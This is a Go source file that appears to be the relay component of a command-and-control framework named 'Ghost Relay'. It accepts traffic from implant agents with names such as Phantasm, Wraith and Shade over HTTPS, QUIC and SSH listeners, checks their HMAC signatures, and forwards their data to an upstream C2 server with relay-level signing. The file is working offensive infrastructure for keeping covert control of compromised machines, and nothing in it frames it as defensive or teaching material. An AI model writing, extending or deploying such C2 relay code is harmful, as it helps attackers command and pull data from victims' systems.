package main

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

// identifyAgent extracts agent_type from the request body JSON
func identifyAgent(body []byte) string {
	// Parse JSON to extract agent_type field
	var bodyWrapper struct {
		AgentType string          `json:"agent_type,omitempty"`
		Data      json.RawMessage `json:"data"`
	}

	if err := json.Unmarshal(body, &bodyWrapper); err != nil {
		// Not valid JSON or missing fields - return empty
		return ""
	}

	return strings.TrimSpace(bodyWrapper.AgentType)
}

// generateHMAC generates HMAC signature for relay -> C2 authentication
func generateHMAC(message string, key []byte) string {
	h := hmac.New(sha256.New, key)
	h.Write([]byte(message))
	return hex.EncodeToString(h.Sum(nil))
}

// signRelayRequest signs a relay -> C2 request with HMAC
// Signs method + path + timestamp (body already validated by agent HMAC)
func signRelayRequest(method, path string, body []byte) (string, string) {
	timestamp := strconv.FormatInt(time.Now().Unix(), 10)
	message := fmt.Sprintf("%s%s%s", method, path, timestamp)
	signature := generateHMAC(message, cfg.ServerHMACKey)
	return timestamp, signature
}

// sendToC2 sends data to the C2 server with relay-level HMAC authentication
func sendToC2(ctx context.Context, endpoint string, headers map[string]string, body []byte) (*http.Response, error) {
	// Build the upstream URL
	upstreamURL, err := url.Parse(cfg.UpstreamBaseURL.String())
	if err != nil {
		return nil, err
	}

	// Add the endpoint to the path
	upstreamURL.Path = endpoint

	// Validate agent's HMAC before forwarding
	// Use struct to preserve json.RawMessage (map[string]interface{} would reorder fields)
	var agentWrapper struct {
		Data      json.RawMessage `json:"data"`
		Timestamp string          `json:"timestamp"`
		Signature string          `json:"signature"`
	}
	if err := json.Unmarshal(body, &agentWrapper); err == nil {
		if agentWrapper.Timestamp != "" && agentWrapper.Signature != "" && len(agentWrapper.Data) > 0 {
			message := fmt.Sprintf("POST%s%s%s", endpoint, agentWrapper.Timestamp, string(agentWrapper.Data))
			expectedSig := generateHMAC(message, cfg.AgentHMACKey)

			if !hmac.Equal([]byte(agentWrapper.Signature), []byte(expectedSig)) {
				logger.Printf("Ghost-relay: Agent HMAC validation FAILED for endpoint %s", endpoint)
				return nil, fmt.Errorf("invalid agent HMAC signature")
			}
		}
	}

	// Create request with agent's data (body forwarded as-is with agent_type preserved)
	req, err := http.NewRequestWithContext(ctx, "POST", upstreamURL.String(), bytes.NewReader(body))
	if err != nil {
		return nil, err
	}

	// Add minimal headers (Content-Type only - no X-Agent-Type injection)
	for key, value := range headers {
		if key == "Content-Type" {
			req.Header.Set(key, value)
		}
	}

	// Add relay-level HMAC headers for relay -> C2 authentication
	timestamp, signature := signRelayRequest("POST", endpoint, body)
	req.Header.Set("X-Relay-Timestamp", timestamp)
	req.Header.Set("X-Relay-Signature", signature)

	// Send request using shared HTTP client (prevents socket leaks)
	return httpClient.Do(req)
}

// setupAcceptHandlers configures and starts all accept handlers
func setupAcceptHandlers(ctx context.Context) error {
	// Create TLS config (shared by TLS-enabled handlers)
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{*cert}, // Use the generated cert
	}

	logger.Printf("=================================================================")
	logger.Printf("GHOST RELAY - Registering Transport Handlers")
	logger.Printf("=================================================================")

	// Register each transport handler (defined in separate accept_*.go files)
	// Comment out any line to disable that transport
	setupHTTPSHandler(ctx, tlsConfig) // accept_https.go - HTTPS on 8080 (Phantasm, Anomaly)
	setupQUICHandler(ctx, tlsConfig)  // accept_quic.go - QUIC on 8081 (Geist, Wraith)
	setupSSHHandler(ctx)              // accept_ssh.go - SSH on 2222 (Shade)

	logger.Printf("=================================================================")
	logger.Printf("Ghost Relay ready - %d transport handlers active", 3)
	logger.Printf("=================================================================")

	return nil
}

// To add a new transport: create accept_<protocol>.go and call it above
